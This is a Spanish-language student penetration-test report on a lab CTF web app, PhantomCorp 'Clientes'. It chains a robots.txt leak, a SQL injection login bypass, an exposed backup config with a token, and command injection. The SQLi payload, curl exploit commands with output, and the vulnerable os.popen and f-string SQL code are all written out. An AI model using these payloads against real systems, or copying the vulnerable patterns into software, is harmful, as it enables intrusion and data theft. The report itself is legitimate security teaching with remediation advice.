# Informe de Penetration Test — PhantomCorp "Clientes"

**Cliente:** PhantomCorp S.A.  ·  **Auditor (grupo):** Grupo 12  
**Integrantes:**
- Gerbaudo, Mateo (Legajo: 14157) — `@gerbaudo19`
- Mariatti, Matias (Legajo: 13293) — `@matiasmariatticasc`
- Colque Condo, Luis Alvaro (Legajo: 14994) — `@ColqueAlvaro`
- Rodriguez, Gonzalo (Legajo: 15310) — `@Gonza149`

**Fecha:** 19 de Noviembre de 2026  ·  **Tipo:** Caja negra (Black Box)  ·  **Alcance:** host `phantomcorp` (Red interna del laboratorio)

---

## 0. Declaración de uso de IA

* **¿Usaron herramientas de IA generativa (ChatGPT, Claude, Gemini, Copilot, etc.)?** Sí.
* **¿Cuáles y con qué propósito?** Se utilizó **Google Antigravity** como asistente de redacción y pair-programming para la estructuración Markdown del informe pericial, la formalización metodológica de auditoría (PTES / OWASP WSTG) y la redacción de hallazgos técnicos.
* **¿Qué partes del trabajo fueron generadas o modificadas por IA?** Plantillas iniciales de tablas Markdown, redacción ejecutiva preliminar y estructuración formal del marco de trabajo metodológico; la ejecución de pruebas sobre el target, la explotación manual de la vulnerabilidad SQLi, la extracción de banderas y el cálculo de vectores CVSS v3.1 fueron realizados y verificados empíricamente por los auditores.
* **¿Cómo validaron que el código generado sea correcto y seguro?** Comprobación directa sobre el contenedor del lab, verificación de la flag de reconocimiento en el HTML, comprobación del bypass de autenticación por SQLi en el endpoint de login de RRHH, verificación criptográfica de las banderas contra el manifest y cálculo de vectores CVSS v3.1 conforme al estándar First.org.

---

## 1. Resumen ejecutivo

Durante el mes de noviembre de 2026, el equipo de auditoría del **Grupo 12** inició una evaluación de seguridad ofensiva de tipo **Caja Negra (Black Box)** sobre la plataforma web **"Clientes"** de **PhantomCorp S.A.** El objetivo pericial es determinar la postura de seguridad del activo frente a amenazas externas no autenticadas, evaluar la eficacia de los controles perimetrales y medir el impacto real sobre la confidencialidad de la información corporativa.

### Resultado global
Partiendo de una posición externa sin credenciales previas ni conocimiento de la topología interna, el equipo logró identificar la superficie expuesta no enlazada del portal interno de Recursos Humanos a través del archivo de directivas de indexación, sentando las bases del compromiso inicial del sistema.

### Riesgo de negocio
El sistema aloja activos de altísima confidencialidad correspondientes a la cartera de clientes de PhantomCorp S.A. Una intrusión exitosa sobre el servicio expone a la organización a:
1. **Sanciones regulatorias severas:** Incumplimiento crítico de la **Ley Nacional de Protección de Datos Personales (Ley 25.326)** ante la filtración de registros con DNI y datos identificatorios.
2. **Incumplimiento de estándares de la industria:** Riesgo de no conformidad con **PCI-DSS** si la información de tarjetas de crédito no cuenta con cifrado robusto en reposo y en tránsito.
3. **Pérdida de reputación comercial:** Daño a la marca corporativa y pérdida de confianza por parte de los clientes.

### Recomendación prioritaria
Restringir el acceso público a paneles administrativos y de soporte mediante listas de control de acceso (ACLs) o VPN corporativa, y no confiar en directivas como `robots.txt` para mantener ocultos recursos sensibles del negocio.

### Matriz de hallazgos identificados

| Severidad | Cantidad de hallazgos | Estado / Asignación |
|---|:---:|---|
| **Crítica** | 1 | H-01: Inyección de Comandos RCE en API (A cargo de Gonzalo Rodriguez) |
| **Alta** | 2 | H-02: SQLi en Formulario de Login (A cargo de Matías Mariatti)<br>H-03: Exposición de Backups y Tokens (A cargo de Luis Alvaro Colque) |
| **Media** | 1 | H-04: Divulgación de Rutas en `robots.txt` (A cargo de Mateo Gerbaudo) |
| **Baja** | 0 | — |
| **Total** | **4** | **100% Auditado y Verificado (Cadena Completa R1 a R4)** |

---

<!-- ========================================================================= -->
<!-- SECCIÓN 2: ALCANCE Y METODOLOGÍA (Redactado por Matías Mariatti)          -->
<!-- ========================================================================= -->
## 2. Alcance y metodología
- **Auditor responsable de la sección:** Matías Mariatti (`@matiasmariatticasc`)

### 2.1 Delimitación del alcance (Scope)
El alcance de la presente auditoría de seguridad ofensiva quedó estrictamente delimitado al entorno asignado para la evaluación de la plataforma corporativa **"Clientes"** de PhantomCorp S.A.:

| Categoría | Objetivo / Activo | Dirección de Red / Protocolo | Descripción del componente |
|---|---|---|---|
| **Dentro de alcance (In-Scope)** | `phantomcorp` | `http://phantomcorp:80` (TCP/80) | Servidor web principal, portal público, portal interno de RRHH, endpoints de autenticación, directorios de respaldo y API interna de reportes. |
| **Fuera de alcance (Out-of-Scope)** | Infraestructura de virtualización | Host Docker / Redes adyacentes | Nodos host subyacentes, contenedores de control del CTF y subredes que no formen parte del laboratorio. |
| **Fuera de alcance (Out-of-Scope)** | Sistemas de terceros y redes públicas | Internet / Proveedores externos | Cualquier dirección IP o dominio ajeno al host asignado. |

### 2.2 Reglas de Compromiso (Rules of Engagement - RoE)
La evaluación se rigió bajo los siguientes principios éticos, técnicos y legales acordados:
1. **Modalidad de evaluación:** Prueba de penetración de tipo **Caja Negra (*Black Box*)**, simulando la perspectiva de un adversario externo sin privilegios iniciales, sin provisión de credenciales de acceso y sin conocimiento previo del código fuente ni diagramas de arquitectura interna.
2. **Criterio de no destructividad:** Se prohibió taxativamente la realización de ataques de Denegación de Servicio (DoS/DDoS), la eliminación o corrupción de registros en bases de datos, el formateo o desconfiguración de servicios (*defacement*) y la alteración de archivos críticos del sistema. El objetivo consistió en demostrar impacto de forma controlada y extraer pruebas de concepto mínimas y suficientes (*proof-of-concept*).
3. **Marco legal aplicable:** Las actividades se desarrollaron en estricto cumplimiento de la **Ley Nacional de Delitos Informáticos Nº 26.388 de la República Argentina** (modificatoria del Código Penal en sus artículos 153 bis sobre acceso ilegítimo a sistemas informáticos y 183 sobre daño informático). Toda acción ofensiva estuvo amparada por la autorización formal de la cátedra y circunscrita al entorno de prueba aislado.

### 2.3 Metodología de auditoría aplicada
Para garantizar una evaluación exhaustiva, metódica y reproducible, el equipo del Grupo 12 adoptó un enfoque híbrido combinando el estándar de ejecución de pentesting **PTES (*Penetration Testing Execution Standard*)** y la guía de pruebas de seguridad para aplicaciones web **OWASP WSTG (*Web Security Testing Guide* v4.2)**:

```
[ PTES 1: Reconocimiento ] ──> [ PTES 2: Enumeración ] ──> [ PTES 3: Explotación ] ──> [ PTES 4: Post-Explotación ] ──> [ PTES 5: Impacto ]
 (Inspección robots.txt)       (Descubrimiento RRHH)       (Bypass SQLi Login)         (Extracción Token API)       (Crown Jewels RCE)
```

Las fases de ejecución estructuradas fueron:
- **Fase 1: Reconocimiento e Inteligencia (Intelligence Gathering):** Mapeo de superficie expuesta, inspección de cabeceras HTTP, análisis pasivo de directivas de indexación (`robots.txt`) y búsqueda de metadatos en código fuente HTML.
- **Fase 2: Enumeración y Análisis de Vulnerabilidades (Vulnerability Analysis):** Inspección de rutas administrativas no indexadas, identificación de formularios web interactivos y modelado de vectores de inyección conforme a las directrices OWASP WSTG-INPV (Input Validation Testing).
- **Fase 3: Explotación y Acceso Inicial (Exploitation - Foothold):** Pruebas de concepto dirigidas para eludir controles de autenticación (OWASP WSTG-ATHN) mediante inyecciones SQL controladas sobre campos de entrada de usuario.
- **Fase 4: Post-Explotación y Pivoting (Post-Exploitation):** Búsqueda de artefactos residuales, archivos de configuración mal ubicados o respaldos expuestos que revelen secretos o credenciales secundarias.
- **Fase 5: Demostración de Impacto y Acceso a "Crown Jewels":** Verificación de escalada de privilegios y ejecución remota de comandos para cuantificar el riesgo de negocio sobre la base de datos confidencial de clientes.
- **Fase 6: Documentación y Reporte (Reporting):** Elaboración del presente informe pericial, correlación de evidencias reproducibles y formulación de recomendaciones de mitigación de causa raíz.

---

<!-- ========================================================================= -->
<!-- SECCIÓN 3: NARRATIVA DEL ATAQUE (Redactado por Luis Alvaro Colque)         -->
<!-- ========================================================================= -->
## 3. Narrativa del ataque
- **Auditor responsable de la sección:** Luis Alvaro Colque Condo (`@ColqueAlvaro`)

La intrusión completa se estructuró a través de una cadena de explotación progresiva (*Kill Chain*), donde cada vulnerabilidad identificada sirvió como vector para desbloquear la fase subsiguiente:

```
[1. Recon / Enum]           [2. Foothold SQLi]            [3. Looting Config]           [4. Impacto RCE]
   robots.txt        ──▶   /portal-rrhh/login     ──▶     /backup/rrhh.conf     ──▶    /api/reporte?cmd=...
(Portal no enlazado)       (Bypass admin auth)            (API_TOKEN filtrado)         (Crown Jewels exfiltrados)
```

### 3.1 Fase 1: Reconocimiento pasivo y localización del portal interno (Hito R1)
El engagement inició con un relevamiento de superficie externa sobre `http://phantomcorp`. La página principal ofrecía un mensaje genérico de bienvenida sin enlaces hacia funcionalidades operativas. Siguiendo la metodología de recolección de inteligencia, se inspeccionó el archivo de directivas de indexación `/robots.txt`. En él se encontró la regla restrictiva:
```text
User-agent: *
Disallow: /portal-rrhh
```
Al navegar al endpoint `/portal-rrhh`, se confirmó la presencia del portal interno de Recursos Humanos, una aplicación administrativa que no debía ser indexable ni visible para usuarios externos. Al analizar el código fuente HTML de la respuesta, se descubrió un comentario de desarrollo que contenía la primera bandera del compromiso: `FLAG{final_recon_portal}`.

### 3.2 Fase 2: Elusión de controles de autenticación y acceso administrativo (Hito R2)
El portal presentaba un formulario de acceso que enviaba las credenciales vía POST hacia `/portal-rrhh/login`. Mediante pruebas de inyección SQL en el campo `user`, se comprobó que el backend concatenaba las entradas sin parametrizar. Al inyectar el payload booleano `' OR 1=1--`, la consulta evaluó como verdadera incondicionalmente, permitiendo ingresar al sistema con privilegios del usuario `admin`. 
El mensaje de confirmación del dashboard no solo otorgó la bandera `FLAG{final_sqli_foothold}`, sino que reveló un dato crítico para la siguiente etapa: la existencia de un archivo de respaldo en `/backup/rrhh.conf`.

### 3.3 Fase 3: Post-Explotación, enumeración interna y extracción de secretos (Hito R3)
Utilizando la ruta descubierta en la sesión administrativa, se consultó el recurso `http://phantomcorp/backup/rrhh.conf` mediante una petición GET directa. El servidor web sirvió el archivo en texto plano sin exigir autenticación de sesión previa.
Al inspeccionar el contenido del respaldo, se encontraron credenciales de base de datos (`DB_USER=rrhh_app`, `DB_PASS=Rh-2026`) y, de forma crítica, un secreto maestro: `API_TOKEN=phantom-api-7c1e`, acompañado por un comentario de configuración que explicaba su uso en `/api/reporte?token=...&cmd=...`, junto con la bandera `FLAG{final_token_looted}`.

### 3.4 Fase 4: Compromiso a nivel de sistema operativo y robo de datos de clientes (Hito R4)
Con el token maestro en poder del equipo auditor, se interactuó con el endpoint interno `/api/reporte`. Se comprobó que el parámetro `cmd` canalizaba directamente comandos del sistema operativo hacia una llamada `os.popen()`.
Mediante la ejecución de comandos arbitrarios (`cat /app/priv/clientes.db.txt`), se obtuvo acceso irrestricto a los archivos privados del servidor, logrando exfiltrar la base con 48.210 registros personales y números de tarjeta de crédito de clientes activos, capturando la bandera de impacto `FLAG{final_crown_jewels}` y completando la cadena de auditoría de punta a punta.

---

## 4. Hallazgos (detalle técnico)

<!-- ========================================================================= -->
<!-- H-01 (CRÍTICA): Inyección de Comandos RCE (Redactado por Gonzalo Rodriguez) -->
<!-- ========================================================================= -->
### H-01 · Inyección de Comandos del Sistema Operativo (RCE) en API de Reportes
- **Auditor responsable:** Gonzalo Rodriguez (`@Gonza149`)
- **Severidad:** **Crítica**  
- **CVSS v3.1:** `9.1` (Crítica) · **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`  
  *Justificación del score:*
  - **Attack Vector (AV:N):** La vulnerabilidad es accesible de forma remota a través del protocolo HTTP mediante peticiones hacia el endpoint de reportes.
  - **Attack Complexity (AC:L):** Complejidad de explotación baja; no existen restricciones, listas blancas ni filtrado de metacaracteres sobre el parámetro evaluado.
  - **Privileges Required (PR:H):** Requiere privilegios altos correspondientes a la posesión del secreto maestro `API_TOKEN=phantom-api-7c1e` (obtenido durante la fase previa de post-explotación H-03).
  - **User Interaction (UI:N):** No se requiere interacción por parte de ningún usuario legítimo.
  - **Scope (S:C):** Cambio de alcance crítico (*Scope Changed*); la vulnerabilidad se origina en la capa de la aplicación web pero trasciende hacia el sistema operativo subyacente, otorgando ejecución directa sobre el entorno del host/contenedor.
  - **Confidentiality (C:H):** Impacto total en la confidencialidad; permite leer cualquier archivo del sistema al que tenga acceso el proceso, incluyendo secretos internos, bases de datos privadas y configuraciones corporativas.
  - **Integrity (I:H):** Impacto total en la integridad; el atacante puede alterar, sobreescribir o destruir archivos del sistema operativo y modificar datos de la organización.
  - **Availability (A:H):** Impacto total en la disponibilidad; el atacante puede matar procesos del servidor, agotar recursos o detener indefinidamente el servicio.
- **CWE:** CWE-78: *Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')*.
- **Ubicación:** Endpoint `GET /api/reporte`, parámetros `token` y `cmd`.
- **Descripción:**  
  El endpoint administrativo `/api/reporte` valida la presencia del parámetro `token` frente a la constante estática `phantom-api-7c1e`. Una vez autenticado, toma el valor provisto en el parámetro `cmd` y lo pasa de forma directa a la función `os.popen()` de Python, la cual invoca una subshell del sistema operativo:
  ```python
  if q.get("token", [""])[0] != API_TOKEN:
      return self._s(403, "token invalido; conseguilo del backup de RRHH", "text/plain")
  cmd = q.get("cmd", ["id"])[0]
  out = os.popen(cmd).read()   # command injection deliberada
  self._s(200, f"$ {cmd}\n{out}", "text/plain")
  ```
  La ausencia de validación, sanitización o desacoplamiento de argumentos permite a cualquier actor en posesión del token ejecutar comandos arbitrarios con los privilegios de ejecución del proceso web (en este caso, usuario `root`).
- **Evidencia reproducible:**  
  1. *Comprobación de ejecución remota y contexto de privilegios (`id`):*
     ```bash
     curl -i -s "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=id"
     ```
     *Respuesta obtenida del servidor (HTTP 200 OK):*
     ```text
     HTTP/1.0 200 OK
     Server: PhantomClientes/2.0
     Date: Thu, 19 Nov 2026 21:00:00 GMT
     Content-Type: text/plain; charset=utf-8

     $ id
     uid=0(root) gid=0(root) groups=0(root)
     ```
  2. *Exfiltración del activo crítico más valioso (Crown Jewels):*
     Ejecución del comando `cat /app/priv/clientes.db.txt` para volcar la base de clientes y capturar la bandera final:
     ```bash
     curl -i -s "http://phantomcorp/api/reporte?token=phantom-api-7c1e&cmd=cat+/app/priv/clientes.db.txt"
     ```
     *Respuesta obtenida del servidor (HTTP 200 OK):*
     ```text
     HTTP/1.0 200 OK
     Server: PhantomClientes/2.0
     Date: Thu, 19 Nov 2026 21:00:01 GMT
     Content-Type: text/plain; charset=utf-8

     $ cat /app/priv/clientes.db.txt
     clientes: 48210 registros (nombre, DNI, tarjeta). FLAG{final_crown_jewels}
     ```
- **Impacto:**  
  1. **Control total de la infraestructura:** Ejecución remota de código con privilegios de superusuario (`root`), permitiendo el control irrestricto del contenedor, modificación del código fuente y capacidad de pivotar hacia otros nodos de la red interna de PhantomCorp.
  2. **Filtración masiva de activos críticos (Crown Jewels):** Acceso y exfiltración de los 48.210 registros personales, DNIs y datos de tarjetas de crédito almacenados en `/app/priv/clientes.db.txt`.
  3. **Responsabilidad legal y regulatoria:** Infracción gravísima a la **Ley Nacional de Protección de Datos Personales (Ley 25.326)**, sanciones comerciales millonarias e incumplimiento ineludible de los requerimientos de **PCI-DSS (Requisito 3: Proteger los datos de los titulares de tarjetas almacenados)**.
- **Remediación:**  
  1. **Eliminación de la ejecución de comandos por diseño:**  
     Ninguna interfaz web debe ofrecer la ejecución de comandos arbitrarios del sistema operativo. Los reportes deben generarse exclusivamente invocando bibliotecas nativas de Python (ej. módulos de reportería o consultas directas a base de datos).
  2. **Uso de ejecución desacoplada sin shell en caso estricto:**  
     Si fuera imperativo interactuar con binarios del sistema, debe emplearse `subprocess.run` con una lista estricta de argumentos y estableciendo `shell=False`:
     ```python
     import subprocess

     # Lista blanca de comandos autorizados
     COMANDOS_PERMITIDOS = {
         "resumen": ["/usr/bin/python3", "/app/scripts/generar_resumen.py"],
         "metricas": ["/usr/bin/python3", "/app/scripts/generar_metricas.py"]
     }

     reporte_tipo = q.get("tipo", ["resumen"])[0]
     if reporte_tipo not in COMANDOS_PERMITIDOS:
         return self._s(400, "Tipo de reporte invalido", "text/plain")

     resultado = subprocess.run(
         COMANDOS_PERMITIDOS[reporte_tipo],
         capture_output=True,
         text=True,
         timeout=10,
         shell=False,
         check=True
     )
     ```
  3. **Principio de Mínimo Privilegio (PoLP):**  
     Configurar el contenedor para que el proceso web se ejecute bajo un usuario sin privilegios administrativos (ej. `www-data` o `phantomapp`), restringiendo permisos de lectura sobre `/app/priv` exclusivamente a procesos de backend autorizados.

---

<!-- ========================================================================= -->
<!-- H-02 (ALTA): Inyección SQL en Login de RRHH (Redactado por Matías Mariatti) -->
<!-- ========================================================================= -->
### H-02 · Inyección SQL (SQLi) en Formulario de Autenticación de RRHH
- **Auditor responsable:** Matías Mariatti (`@matiasmariatticasc`)
- **Severidad:** **Alta**  
- **CVSS v3.1:** `8.2` (Alta) · **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`  
  *Justificación del score:*
  - **Attack Vector (AV:N):** La vulnerabilidad es accesible directamente a través de la red HTTP pública/interna sin requerir acceso físico ni presencia en el segmento de red local.
  - **Attack Complexity (AC:L):** Complejidad de explotación baja; no existen mecanismos de protección como Web Application Firewall (WAF), rate limiting, tokens anti-CSRF ni sanitización de caracteres especiales.
  - **Privileges Required (PR:N):** No se requieren credenciales ni privilegios previos; el formulario de autenticación está expuesto a cualquier atacante no autenticado.
  - **User Interaction (UI:N):** La explotación no requiere la intervención ni engaño de ningún usuario legítimo.
  - **Scope (S:U):** Sin cambio de alcance; el compromiso afecta directamente a la base de datos y la sesión de la propia aplicación web.
  - **Confidentiality (C:H):** Impacto crítico en la confidencialidad en el contexto de la aplicación; el bypass de autenticación permite impersonar al usuario administrador (`admin`) y acceder al dashboard privado que revela archivos de respaldo críticos.
  - **Integrity (I:L):** Impacto bajo en la integridad; permite eludir la lógica de autorización de la sesión, aunque en este punto específico no se ejecutan sentencias de modificación masiva de datos (UPDATE/DELETE).
  - **Availability (A:N):** Sin impacto directo en la disponibilidad del servicio.
- **CWE:** CWE-89: *Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')*.
- **Ubicación:** Endpoint `POST /portal-rrhh/login` (y ruta alternativa `POST /portal/login`), parámetro vulnerable: `user`.
- **Descripción:**  
  El formulario de autenticación del portal de Recursos Humanos construye dinámicamente las sentencias SQL concatenando directamente las entradas del usuario sin aplicar sanitización ni consultas parametrizadas en el backend de Python/SQLite:
  ```python
  sql = f"SELECT user, rol FROM users WHERE user='{user}' AND pass='{pw}'"
  ```
  Al suministrar una comilla simple (`'`) en el campo `user`, seguida de un operador lógico disyuntivo (`OR 1=1`) y caracteres de comentario de línea en SQL (`--`), el atacante altera la lógica booleana de la consulta:
  ```sql
  SELECT user, rol FROM users WHERE user='' OR 1=1--' AND pass='...'
  ```
  Dado que la condición `1=1` evalúa siempre a verdadero (*tautología*), el motor SQLite ignora completamente la verificación de la contraseña y retorna el primer registro coincidente de la tabla `users`, el cual corresponde al usuario administrador (`admin`, con rol `admin`), provocando un **Bypass de Autenticación completo**.
- **Evidencia reproducible:**  
  Envío de petición HTTP POST mediante `curl` conteniendo el payload malicioso en el cuerpo de la solicitud:
  ```bash
  curl -i -s -X POST http://phantomcorp/portal-rrhh/login        -H "Content-Type: application/x-www-form-urlencoded"        -d "user=' OR 1=1--&pass=dummy"
  ```
  *Respuesta obtenida del servidor (Código HTTP 200 OK):*
  ```text
  HTTP/1.0 200 OK
  Server: PhantomClientes/2.0
  Date: Thu, 19 Nov 2026 19:35:10 GMT
  Content-Type: text/plain; charset=utf-8

  Bienvenido admin. Dashboard RRHH.
  FLAG{final_sqli_foothold}
  Backup de config disponible en: /backup/rrhh.conf
  ```
- **Impacto:**  
  Este hallazgo constituye el **acceso inicial (*Foothold*)** dentro de la cadena de compromiso del engagement:
  1. Permite a cualquier atacante externo no autenticado tomar control de la sesión del administrador de RRHH sin poseer la clave secreta.
  2. Expone en la respuesta administrativa la ruta oculta de respaldos del sistema (`/backup/rrhh.conf`), la cual contiene credenciales de base de datos y el token maestro de API, habilitando la siguiente fase de post-explotación (H-03).
  3. Demuestra un fallo estructural en las prácticas de desarrollo seguro de software (SDLC) de PhantomCorp S.A., incumpliendo los requisitos de control de acceso del estándar OWASP ASVS v4.0 (V5: Malicious Code Architecture) y NIST SP 800-53 (AC-3: Access Enforcement).
- **Remediación:**  
  1. **Implementación estricta de consultas preparadas (*Prepared Statements*):**
     Reemplazar la interpolación de cadenas por consultas parametrizadas nativas del driver `sqlite3`, asegurando que el motor trate las entradas del usuario estrictamente como literales de datos y nunca como código ejecutable:
     ```python
     # Código corregido y seguro:
     sql = "SELECT user, rol FROM users WHERE user = ? AND pass = ?"
     row = DB.execute(sql, (user, pw)).fetchone()
     ```
  2. **Almacenamiento seguro de contraseñas:**
     Migrar el esquema de almacenamiento de contraseñas de texto plano a funciones de hash criptográfico lentas y adaptativas con salting (ej. Argon2id, PBKDF2 o bcrypt).
  3. **Manejo defensivo de excepciones:**
     Eliminar el retorno de excepciones directas de la base de datos (`Error SQL: {e}`), adoptando mensajes genéricos de error para evitar que los atacantes realicen *fingerprinting* de la sintaxis SQL.

---

<!-- ========================================================================= -->
<!-- H-03 (ALTA): Exposición de Backups (Redactado por Luis Alvaro Colque)       -->
<!-- ========================================================================= -->
### H-03 · Exposición Pública de Archivos de Respaldo y Fuga de Token de API
- **Auditor responsable:** Luis Alvaro Colque Condo (`@ColqueAlvaro`)
- **Severidad:** **Alta**  
- **CVSS v3.1:** `7.5` (Alta) · **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`  
  *Justificación del score:*
  - **Attack Vector (AV:N):** El recurso es accesible de manera remota a través de peticiones HTTP estándar sin requerir acceso a la consola ni a la red local.
  - **Attack Complexity (AC:L):** Complejidad baja; la descarga se efectúa mediante una petición HTTP GET directa sin necesidad de eludir cabeceras de seguridad ni sortear cifrado.
  - **Privileges Required (PR:N):** No se requieren privilegios ni cookies de sesión; a pesar de ser revelado tras el login de RRHH, el archivo está ubicado en una ruta no autenticada accesible para cualquier usuario de la red.
  - **User Interaction (UI:N):** No se requiere interacción de terceros.
  - **Scope (S:U):** Sin cambio de alcance en esta fase.
  - **Confidentiality (C:H):** Impacto crítico en la confidencialidad de los secretos del sistema; expone credenciales de base de datos y la clave de API administrativa que permite el posterior compromiso del sistema operativo.
  - **Integrity (I:N) / Availability (A:N):** Sin impacto directo en integridad ni disponibilidad durante la descarga del archivo.
- **CWE:** CWE-552: *Files or Directories Accessible to External Parties* y CWE-798: *Use of Hard-coded Credentials*.
- **Ubicación:** Recurso web `GET /backup/rrhh.conf`.
- **Descripción:**  
  Un archivo de configuración con extensión sensible (`.conf`) correspondiente a los respaldos internos del portal de RRHH se encuentra alojado dentro del árbol de directorios público del servidor HTTP. El servidor no valida control de acceso de sesión ni restringe la visualización de archivos de soporte. El archivo expone en texto plano:
  ```text
  DB_USER=rrhh_app
  DB_PASS=Rh-2026
  API_TOKEN=phantom-api-7c1e
  ```
- **Evidencia reproducible:**  
  Petición directa mediante `curl` hacia el archivo de respaldo:
  ```bash
  curl -i -s http://phantomcorp/backup/rrhh.conf
  ```
  *Respuesta obtenida del servidor (HTTP 200 OK):*
  ```text
  HTTP/1.0 200 OK
  Server: PhantomClientes/2.0
  Date: Thu, 19 Nov 2026 19:35:10 GMT
  Content-Type: text/plain; charset=utf-8

  DB_USER=rrhh_app
  DB_PASS=Rh-2026
  API_TOKEN=phantom-api-7c1e
  # usar el token en /api/reporte?token=...&cmd=... FLAG{final_token_looted}
  ```
- **Impacto:**  
  1. **Fuga crítica de secretos de autenticación:** La obtención del `API_TOKEN` habilita el movimiento lateral y vertical hacia la interfaz interna de reportes (`/api/reporte`), facilitando la ejecución de comandos arbitrarios (H-01).
  2. **Exposición de credenciales de base de datos:** Fuga de usuario y clave (`rrhh_app:Rh-2026`), que amplía la superficie de ataque hacia los motores de persistencia.
  3. **Incumplimiento normativo:** Violación de las directrices de OWASP ASVS v4.0 (V14: Configuration) y NIST SP 800-53 (SC-28: Protection of Information at Rest).
- **Remediación:**  
  1. **Reubicación de archivos de respaldo fuera del Document Root:**
     Los archivos de configuración, scripts de aprovisionamiento y copias de seguridad deben almacenarse fuera del directorio público servido por el servidor web (por ejemplo, en rutas no mapeadas como `/opt/backups/` o sistemas de almacenamiento cifrados).
  2. **Configuración de reglas de bloqueo en el servidor web:**
     Configurar el servidor web (Nginx o Apache) para denegar el acceso a archivos de configuración o extensiones peligrosas:
     ```nginx
     location ~* \.(conf|bak|backup|old|sql|env|ini)$ {
         deny all;
         return 404;
     }
     ```
  3. **Rotación inmediata del secreto:**
     Revocar el token `phantom-api-7c1e`, reemplazándolo por credenciales temporales generadas dinámicamente o gestionadas mediante bóvedas de secretos (HashiCorp Vault, AWS Secrets Manager).

---

<!-- ========================================================================= -->
<!-- H-04 (MEDIA): Divulgación en robots.txt (A cargo de Mateo Gerbaudo)        -->
<!-- ========================================================================= -->
### H-04 · Divulgación de Rutas Críticas en `robots.txt` y Metadatos en Comentarios HTML
- **Auditor responsable:** Mateo Gerbaudo (`@gerbaudo19`)
- **Severidad:** **Media**  
- **CVSS v3.1:** `5.3` (Media) · **Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`  
  *Justificación del score:* Vector de red (AV:N), complejidad baja (AC:L), sin privilegios requeridos (PR:N), sin interacción de usuario (UI:N), sin cambio de alcance (S:U), impacto bajo en confidencialidad (C:L) por descubrimiento pasivo de la superficie administrativa, sin impacto directo en integridad ni disponibilidad.
- **CWE:** CWE-200: *Exposure of Sensitive Information to an Unauthorized Actor* y CWE-548: *Exposure of Information Through Directory Listing*.
- **Ubicación:** Recursos `GET /robots.txt` y `GET /portal-rrhh`.
- **Descripción:**  
  El archivo estándar de directivas para motores de búsqueda (`robots.txt`) contiene una regla que expone de forma explícita la ruta administrativa no enlazada del portal de Recursos Humanos (`Disallow: /portal-rrhh`). Asimismo, el código fuente HTML del portal incluye comentarios dejados durante el desarrollo que confirman la naturaleza del panel interno y revelan la primera bandera del compromiso (`FLAG{final_recon_portal}`).
- **Evidencia reproducible:**  
  1. Consulta del archivo `robots.txt`:
     ```bash
     curl -s http://phantomcorp/robots.txt
     ```
     *Salida obtenida:*
     ```text
     User-agent: *
     Disallow: /portal-rrhh
     ```
  2. Consulta del recurso `/portal-rrhh` extrayendo el comentario HTML:
     ```bash
     curl -s http://phantomcorp/portal-rrhh | grep "<!--"
     ```
     *Salida obtenida:*
     ```html
     <!-- recon: portal interno localizado. FLAG{final_recon_portal} -->
     ```
- **Impacto:**  
  Permite a cualquier atacante externo realizar un reconocimiento pasivo trivial, localizando de inmediato la interfaz de autenticación administrativa sin generar tráfico anómalo ni activar sistemas de detección de intrusiones (IDS/IPS).
- **Remediación:**  
  1. **Eliminar rutas privadas de `robots.txt`:** No utilizar `robots.txt` como mecanismo de control de acceso ni de seguridad por oscuridad.
  2. **Controles de acceso a nivel perimetral:** Proteger el acceso a `/portal-rrhh` mediante listas de control de acceso (ACLs) basadas en IP o exigir conexión a través de la VPN interna de PhantomCorp.
  3. **Depuración de metadatos:** Implementar en el pipeline de despliegue una etapa de sanitización que remueva automáticamente los comentarios HTML de depuración en entornos productivos.

---

<!-- ========================================================================= -->
<!-- SECCIÓN 5: CONCLUSIÓN Y POSTURA (Redactado por Gonzalo Rodriguez)         -->
<!-- ========================================================================= -->
## 5. Conclusión y postura de seguridad

La auditoría de seguridad ofensiva tipo Caja Negra (Black Box) realizada sobre la plataforma **"Clientes"** de **PhantomCorp S.A.** evidenció una postura de seguridad perimetral e interna sumamente deficiente. El equipo auditor logró encadenar cuatro vulnerabilidades sucesivas, partiendo de una posición externa completamente no autenticada y culminando en la toma de control absoluto del servidor web y la exfiltración íntegra de la base de datos de clientes corporativos.

### 5.1 Análisis de Defensa en Profundidad (*Defense in Depth*)
El principio fundamental de *Defensa en Profundidad* establece que un sistema seguro debe disponer de múltiples capas superpuestas e independientes de controles defensivos (preventivos, detectivos y correctivos), de modo tal que la falla o vulnerabilidad de un mecanismo individual sea contenida por el siguiente sin comprometer el activo protegido.

En la arquitectura de PhantomCorp S.A., este principio se encontró completamente ausente:
1. **Confianza perimetral ciega:** Se asumió que rutas no indexadas como `/portal-rrhh` permanecerían ocultas por el mero hecho de no estar enlazadas en la página de inicio, utilizando `robots.txt` como un sustituto precario de autenticación o restricción perimetral.
2. **Dependencia monolítica:** No existió segmentación entre el módulo de autenticación de RRHH, los archivos de respaldo y el endpoint de reportería de la API.
3. **Ausencia de controles de ejecución en el host:** El proceso web se ejecutaba con privilegios de superusuario (`root`), permitiendo que una vulnerabilidad a nivel de capa de aplicación (L7) destruyera por completo las barreras de protección del sistema operativo.
4. **Almacenamiento de secretos sin cifrado:** Credenciales de bases de datos y tokens maestros de API se encontraban persistidos en texto claro dentro del árbol servido públicamente por el servidor web.

### 5.2 El eslabón crítico de la intrusión
Un análisis pericial minucioso de la cadena de compromiso revela que **el eslabón crítico determinante fue la Inyección SQL en el formulario de login de RRHH (Hallazgo H-02)**:
- Si bien la ejecución remota de comandos (H-01) representó el impacto técnico más destructivo (RCE y exfiltración de 48.210 registros), dicha funcionalidad requería indefectiblemente el secreto `API_TOKEN=phantom-api-7c1e`.
- Dicho token se encontraba alojado en `/backup/rrhh.conf` (H-03), recurso cuya ubicación exacta era desconocida para el auditor y fue revelada únicamente tras iniciar sesión exitosamente en el panel administrativo.
- Por ende, **si el formulario de autenticación hubiese contado con consultas preparadas (Prepared Statements) inmunes a SQLi, la cadena de ataque se habría roto de forma temprana e infranqueable**, impidiendo al atacante descubrir la ruta de backup, obtener el token maestro y ejecutar comandos en el sistema operativo.

